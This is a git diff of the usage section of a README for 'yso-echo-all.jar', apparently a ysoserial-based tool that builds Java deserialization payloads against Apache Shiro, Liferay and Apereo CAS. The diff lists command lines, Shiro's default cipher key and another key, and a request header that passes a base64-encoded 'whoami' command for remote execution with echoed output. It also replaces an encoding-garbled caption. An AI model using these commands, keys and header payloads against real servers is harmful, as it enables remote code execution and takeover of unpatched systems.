@@ -18,20 +18,27 @@
 ## 0x03 Usage
 
 ```
-Usage: java -jar yso-echo-all.jar [payload] win
-Usage: java -jar yso-echo-all.jar [payload] linux
+Author: JF
 
-Usage: java -jar yso-echo-all.jar shiro_CommonsBeanutils1 win [key default kPH+bIxk5D2deZiIxcaaaA==]
-Usage: java -jar yso-echo-all.jar shiro_CommonsBeanutils1 win kPH+bIxk5D2deZiIxcaaaA==
-Usage: java -jar yso-echo-all.jar liferay_CommonsBeanutils1 linux
-Usage: java -jar yso-echo-all.jar apereo_CommonsCollections2 linux
+Usage: java -jar yso-echo-all.jar shiro linux [key default kPH+bIxk5D2deZiIxcaaaA==]
+Usage: java -jar yso-echo-all.jar shiro linux 0AvVhmFLUs0KTA3Kprsdag==
+Usage: java -jar yso-echo-all.jar liferay win
+Usage: java -jar yso-echo-all.jar apereo linux
 
-[Add Request header] c: d2hvYW1p (whoami)
+[Add Request header] c=d2hvYW1p (whoami)
+
+  Available payload types:
+     Payload Authors Dependencies
+     ------- ------- ------------
+     apereo          commons-collections4:4.0
+     liferay         commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
+     shiro           commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
+
 ```
 
 ## 0x04 Screenshot
 
-shiro springª∑æ≥ªÿœ‘
+shiro spring env
 ![shiro_spring_env.png](./screenshot/shiro_spring_env.png)
 
 ## 0x05 Reference
